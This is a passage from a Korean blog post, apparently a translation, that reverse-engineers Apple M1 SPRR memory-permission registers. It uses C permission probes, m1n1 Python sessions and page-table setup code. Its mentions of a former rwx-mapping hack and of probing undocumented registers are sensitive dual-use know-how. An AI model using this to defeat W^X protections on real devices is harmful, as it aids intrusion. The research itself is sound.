class="hljs-keyword">if</span> (v == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> (*fun_ptr)(<span class="hljs-keyword">uint64_t</span>) = ptr;    <span class="hljs-keyword">uint64_t</span> res = fun_ptr(<span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sprr_test</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr, <span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> a, b;    a = read_sprr_perm();    write_sprr_perm(v);    b = read_sprr_perm();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx: %c%c%c\n&quot;</span>, b, can_read(ptr) ? <span class="hljs-string">&#x27;r&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>, can_write(ptr) ? <span class="hljs-string">&#x27;w&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>,           can_exec(ptr) ? <span class="hljs-string">&#x27;x&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-title">make_sprr_val</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> nibble)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i)        res |= ((<span class="hljs-keyword">uint64_t</span>)nibble) &lt;&lt; (<span class="hljs-number">4</span> * i);    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)argc;    (<span class="hljs-keyword">void</span>)argv;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span>    sigfillset(&amp;sa.sa_mask);    sa.sa_sigaction = bus_handler;    sa.sa_flags = SA_RESTART | SA_SIGINFO;    sigaction(SIGBUS, &amp;sa, <span class="hljs-number">0</span>);    sa.sa_sigaction = sev_handler;    sigaction(SIGSEGV, &amp;sa, <span class="hljs-number">0</span>);    <span class="hljs-keyword">uint32_t</span> *ptr = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_JIT, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);    write_sprr_perm(<span class="hljs-number">0x3333333333333333</span>);    ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0xd65f03c0</span>; <span class="hljs-comment">// ret</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i)        sprr_test(ptr, make_sprr_val(i));&#125;</code></pre></li></ul><p>다음과 같은 결과 테이블이 주어진다.</p><table><thead><tr><th>레지스터 값</th><th>페이지 권한</th></tr></thead><tbody><tr><td>00</td><td><code>---</code></td></tr><tr><td>01</td><td><code>r-x</code></td></tr><tr><td>10</td><td><code>r--</code></td></tr><tr><td>11</td><td><code>rw-</code></td></tr></tbody></table><p>APRR의 동작 방식보다 훨씬 단순하다. 두 개의 레지스터를 사용하여 첫 권한을 설정하고 다른 레지스터를 마스킹하는 대신에 4개의 값 중 하나로만 수정할 수 있다. APRR은 userspace에 <code>rxw</code> 매핑을 생성할 수 있는 해킹 방법이 존재하였는데, 이를 인코딩하는 방법이 없으므로 불가능하다. 시스템 레지스터의 다른 바이트들은 페이지 테이블 엔트리에 인코딩 된 16개의 다른 사용 권한일 수도 있다. 그러면 시스템 레지스터의 나머지는 알 수 없겠는걸</p><p>이제 새로운 하드웨어 기능의 동작 방식에 대해 살펴보자.</p><p>애플의 하이퍼바이저 프레임워크를 사용하여 EL1에서 코드를 실행하여 SPRR이 어떻게 동작하는지 확인하고 싶었지만, SPRR과 연관된 레지스터에 접근하면 오류가 발생했다. 대신에 베어 메탈(bare metal)을 통해 EL2에서 코드를 실행하자.</p><h2 id="m1n1"><a href="#m1n1" class="headerlink" title="m1n1"></a>m1n1</h2><p>이전 아이폰 해커들은 XNU을 정적 리버싱 하거나 exploit 하기 위해 EL1까지 가는 과정을 실험했다. 하지만 M1은 많은 하드웨어 기능을 공유하며 부트 프로세스에서 서명되지 않은 코드를 실행할 수 있다.</p><p>M1에 대한 upstream linux 지원을 목표로 하는 Asahi Linux project의 일부로 m1n1이라 불리는 작은 부트로더/하드웨어 플랫폼이 개발되었다. m1n1은 XNU와 동시에 제어 권한을 갖는다. 아래의 모든 작업은 EL2에서 실행할 수 있는 shellcode로 작성할 수 있지만 m1n1을 사용하여 진행한다.</p><h2 id="Python에서-알-수-없는-시스템-레지스터-발견"><a href="#Python에서-알-수-없는-시스템-레지스터-발견" class="headerlink" title="Python에서 알 수 없는 시스템 레지스터 발견"></a>Python에서 알 수 없는 시스템 레지스터 발견</h2><p>m1n1은 shellcode를 컴파일하고 로드하고 데이터 추출을 핸들링하는 등 이러한 모든 세부 사항을 파이썬 쉘에서 직접 하드웨어를 조작할 수 있다. 또 최근 필자의 USB 가젯 코드를 병합하여 m1 MAC과 일반 USB 케이블만으로 테스트할 수 있다.</p><p><code>proxyclient/shell.py</code>를 실행하자. 유저 랜드 SPRR 레지스터에 접근하면 예외가 발생한다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))TTY&gt; Exception: SYNCTTY&gt; Exception taken <span class="hljs-keyword">from</span> EL2hTTY&gt; Running <span class="hljs-keyword">in</span> EL2TTY&gt; MPIDR: <span class="hljs-number">0x80000000</span>TTY&gt; Registers: (@<span class="hljs-number">0x8046b3db0</span>)TTY&gt;   x0-x3: <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span>TTY&gt;   x4-x7: <span class="hljs-number">0000000810</span>cb8000 <span class="hljs-number">0000000000007</span>a69 <span class="hljs-number">0000000804630004</span> <span class="hljs-number">0000000804630000</span>TTY&gt;  x8-x11: <span class="hljs-number">0000000000000000</span> <span class="hljs-number">00000000</span>ffffffc8 <span class="hljs-number">00000008046</span>b3eb0 <span class="hljs-number">000000000000002</span>cTTY&gt; x12-x15: <span class="hljs-number">0000000000000003</span> <span class="hljs-number">0000000000000001</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">00000008046</span>b3b20TTY&gt; x16-x19: <span class="hljs-number">00000008045</span>caa80 <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">000000080462</span>b000TTY&gt; x20-x23: <span class="hljs-number">00000008046</span>b3f78 <span class="hljs-number">00000008046</span>b3fa0 <span class="hljs-number">0000000000000002</span> <span class="hljs-number">00000008046</span>b3f98TTY&gt; x24-x27: <span class="hljs-number">00000008046</span>b3f70 <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000001</span> <span class="hljs-number">0000000000000001</span>TTY&gt; x28-x30: <span class="hljs-number">00000008046</span>b3fa0 <span class="hljs-number">00000008046</span>b3eb0 <span class="hljs-number">00000008045</span>bad90TTY&gt; PC:       <span class="hljs-number">0x810cb8000</span> (rel: <span class="hljs-number">0xc70c000</span>)TTY&gt; SP:       <span class="hljs-number">0x8046b3eb0</span>TTY&gt; SPSR_EL1: <span class="hljs-number">0x60000009</span>TTY&gt; FAR_EL1:  <span class="hljs-number">0x0</span>TTY&gt; ESR_EL1:  <span class="hljs-number">0x2000000</span> (unknown)TTY&gt; L2C_ERR_STS: <span class="hljs-number">0x11000ffc00000000</span>TTY&gt; L2C_ERR_ADR: <span class="hljs-number">0x0</span>TTY&gt; L2C_ERR_INF: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_LSU_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_FED_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_MMU_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; Recovering <span class="hljs-keyword">from</span> exception (ELR=<span class="hljs-number">0x810cb8004</span>)Traceback (most recent call last):  File <span class="hljs-string">&quot;/opt/homebrew/Cellar/python@3.9/3.9.4/Frameworks/Python.framework/Versions/3.9/lib/python3.9/code.py&quot;</span>, line <span class="hljs-number">90</span>, <span class="hljs-keyword">in</span> runcode    exec(code, self.locals)  File <span class="hljs-string">&quot;&lt;console&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;  File <span class="hljs-string">&quot;/Users/speter/asahi/git/m1n1/proxyclient/utils.py&quot;</span>, line <span class="hljs-number">80</span>, <span class="hljs-keyword">in</span> mrs    <span class="hljs-keyword">raise</span> ProxyError(<span class="hljs-string">&quot;Exception occurred&quot;</span>)proxy.ProxyError: Exception occurred&gt;&gt;&gt;</code></pre><p>커널은 컨텍스트 전환 중에 이 레지스터를 수정할 수 있어야 한다. 이는 enable bit가 있음을 의미하며 m1n1 repository에 사용 가능한 시스템 레지스터를 찾는 파이썬 툴이 있다. 내부적으로 모든 명령에 대해 mrs 명령을 생성하고 정의되지 않은 레지스터로 이한 예외를 복구한다. 그것을 실행하여 근처의 레지스터를 찾는다.</p><pre><code class="hljs python">$ python3 proxyclient/find_all_regs.py | grep s3_6_c15_c1_s3_6_c15_c1_0 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0x0</span>s3_6_c15_c1_2 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>) = <span class="hljs-number">0x0</span>s3_6_c15_c1_4 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>) = <span class="hljs-number">0x0</span></code></pre><p>MMU를 비활성화하고 각 레지스터에 모든 레지스터를 작성하고, 레지스터를 다시 찾아서 새로운 레지스터를 식별한다. 이것은 몇 줄의 파이썬 코드로 수행할 수 있다.</p><pre><code class="hljs python"><span class="hljs-keyword">with</span> u.mmu_disabled():    <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> [(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)]:        old_regs = find_regs()        u.msr(reg, <span class="hljs-number">1</span>)        new_regs = find_regs()        diff_regs = new_regs - old_regs        print(reg)        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> sorted(diff_regs):            print(<span class="hljs-string">&quot;  %s&quot;</span> % list(r))    u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-number">0</span>)    u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>)</code></pre><ul><li><p>활성화된 시스템 레지스터</p>  <pre><code class="hljs python">(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>](<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  [<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>]</code></pre></li></ul><p><code>S3_6_C15_C1_0</code>를 <code>SPRR_CONFIG_EL1</code>로 칭하자. 그 레지스터의 비트 1은 SPRR을 활성화하고 모든 비트를 설정한 후 추가적인 변경을 위해 모든 SPRR 레지스터를 잠그는 것으로 보인다. <code>S3_6_C15_1_2</code>과 그것을 활성화하는 레지스터는 파트 2에서 중요하다.</p><p><code>S3_6_C15_C1_5</code>의 모든 비트를 수정할 수 있다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>p.mmu_shutdown()TTY&gt; MMU: shutting down...TTY&gt; MMU: shutdown successful, clearing cache<span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-number">1</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<span class="hljs-number">0x0</span><span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>), <span class="hljs-number">0xffffffffffffffff</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<span class="hljs-number">0xffffffffffffffff</span>&gt;&gt;&gt;</code></pre><p>이 레지스터가 EL0에 적용되는 것 같지만, 여기서는 EL2에서 실행된다. 새로 활성화된 레지스터 <code>S3_6_C15_C1_6</code>은 EL1에 대한 것이며 <code>S3_6_C15_C1_7</code>은 EL2에 대한 것이라고 가정할 수 있다. M1은 항상 <code>HCR_EL2.E2H</code>로 실행되며 E1 레지스터에 대한 접근을 EL2 counterparts로 리다이렉션 한다. 이를 사용하여 가정을 증명할 수 있다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>), <span class="hljs-number">0xdead0000</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>))<span class="hljs-number">0xdead0000</span>&gt;&gt;&gt;</code></pre><p>SPRR을 이제 활성화할 수 있으며 EL2 권한으로 사용되는 것 같은 레지스터도 있다. 이 레지스터의 4 비트를 이해하기 위해 유저 랜드에서 한 실험을 해보자.</p><h2 id="SPRR-리버스-엔지니어링"><a href="#SPRR-리버스-엔지니어링" class="headerlink" title="SPRR 리버스 엔지니어링"></a>SPRR 리버스 엔지니어링</h2><p>간단한 페이지 테이블을 설정하기 위한 파이썬 코드를 작성한 후 유저 랜드에서 했던 것과 동일하게 실험할 수 있다. <code>S3_6_C15_C1_6</code>의 권한 바이트를 페이지에 매핑하고 해당 페이지에서 읽기, 쓰기, 실행을 해보자.</p><p>파이썬에서 이 작업을 완벽하게 수행하는 것은 <code>r-x</code> 페이지에서 실행되고 스택을 <code>rw-</code> 페이지에 유지하기 위해 m1n1을 변경할 때만 가능하다. 파이썬에서 가능한 많은 설정 작업을 하고 shellcode를 작성하고 다른 코어에서 실행하는 것이 훨씬 쉽다. 하나가 중단되더라도 재부팅이 되기 전에 다른 것이 남아있다.</p><pre><code class="hljs python">pagetable = ARMPageTable(heap.memalign, heap.free)pagetable.map(<span class="hljs-number">0x800000000</span>, <span class="hljs-number">0x800000000</span>, <span class="hljs-number">0xc00000000</span>, <span class="hljs-number">0</span>)   <span class="hljs-comment"># normal memory, we run from here</span>pagetable.map(<span class="hljs-number">0xf800000000</span>, <span class="hljs-number">0x800000000</span>, <span class="hljs-number">0xc00000000</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># probe memory, we&#x27;ll try to read/write/execute this</span><span class="hljs-comment"># ...</span>code_page = build_and_write_code(heap, <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    // [...]</span><span class="hljs-string">                // prepare and enable MMU</span><span class="hljs-string">                ldr x0, =0x0400ff</span><span class="hljs-string">                msr MAIR_EL1, x0</span><span class="hljs-string">                ldr x0, =0x27510b510 // borrowed from m1n1&#x27;s MMU code</span><span class="hljs-string">                msr TCR_EL1, x0</span><span class="hljs-string">                ldr x0, =0x&#123;ttbr:x&#125;</span><span class="hljs-string">                msr TTBR0_EL1, x0</span><span class="hljs-string">                mrs x0, SCTLR_EL1</span><span class="hljs-string">                orr x1, x0, #5</span><span class="hljs-string">                msr SCTLR_EL1, x1</span><span class="hljs-string">                isb</span><span class="hljs-string">    // [...]</span><span class="hljs-string">&quot;&quot;&quot;</span>.format(ttbr=pagetable.l0)<span class="hljs-comment"># ...</span>ret = p.smp_call_sync(<span class="hljs-number">1</span>, code_page, sprr_val)<span class="hljs-comment"># ...</span></code></pre><p>signal handler는 이제 exception vector가 된다. 단일 레지스터를 수정하여 failure를 표시한 후 프로그램 카운터를 두 번 이동한 후 return 한다. 첫 번째 명령어는 다시 실행하고 싶지 않은 잘못된 명령이다. 두 번째는 <code>mov x10, 0x80</code>으로 접근을 성공했음을 표시하며 예외가 처리될 경우 표시되지 않는다.</p><pre><code class="hljs python">_fault_handler:<span class="hljs-comment"># store that we failed</span>mov x10, <span class="hljs-number">0xf1</span>mrs x12, ELR_GL2  <span class="hljs-comment"># get the PC that faulted</span>add x12, x12, <span class="hljs-number">8</span>   <span 